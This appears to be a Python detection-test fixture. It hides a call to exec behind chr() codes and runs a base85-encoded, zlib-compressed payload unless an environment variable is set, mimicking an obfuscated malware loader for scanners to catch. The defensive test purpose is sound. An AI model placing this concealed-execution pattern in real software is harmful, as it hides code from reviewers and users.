# FIXTURE ONLY - synthetic detection test sample, not real malware
import builtins
import base64
import zlib
import os

_RUN = getattr(builtins, chr(101) + chr(120) + chr(101) + chr(99))
if os.environ.get("DAS_STAGED") != "1":
    _RUN(zlib.decompress(base64.b85decode("c$guBO#AXe")).decode())
